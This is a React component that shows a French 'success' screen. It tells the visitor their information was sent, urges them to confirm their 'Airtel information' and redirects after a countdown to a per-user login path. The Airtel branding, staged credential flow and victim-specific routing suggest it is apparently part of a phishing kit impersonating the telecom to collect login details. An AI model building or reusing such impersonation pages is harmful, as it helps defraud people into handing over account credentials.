import React, { useState, useEffect } from 'react'

function Success() {
  const [name, setName] = useState("Client")
  const [countdown, setCountdown] = useState(4)

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search)
    const urlName = urlParams.get('name')
    if (urlName) {
      setName(decodeURIComponent(urlName))
    }
    
    if (countdown > 0) {
      const id = setTimeout(() => setCountdown(c => c - 1), 1000)
      return () => clearTimeout(id)
    }
    
    if (countdown === 0) {
      const user = window.location.pathname.split("/")[1]
      setTimeout(() => {
        window.location.href = `/${user}/login`
      }, 1000)
    }
  }, [countdown])

  return (
    <div className="_successcont_gxo1w_1">
      <h1>
        Succès ! Félicitations. 🎉 
        <br />
        {name || "Client"}
      </h1>
      <p>Vos informations ont été transmises avec succès.</p>
      <p>
        Pour l'étape suivante, vous devez confirmer vos
        <b style={{ color: " rgb(9, 20, 37)" }}> informations Airtel.</b>
      </p>
      <span>Redirection vers la page de connexion Airtel... {countdown}s</span>
    </div>
  )
}

export default Success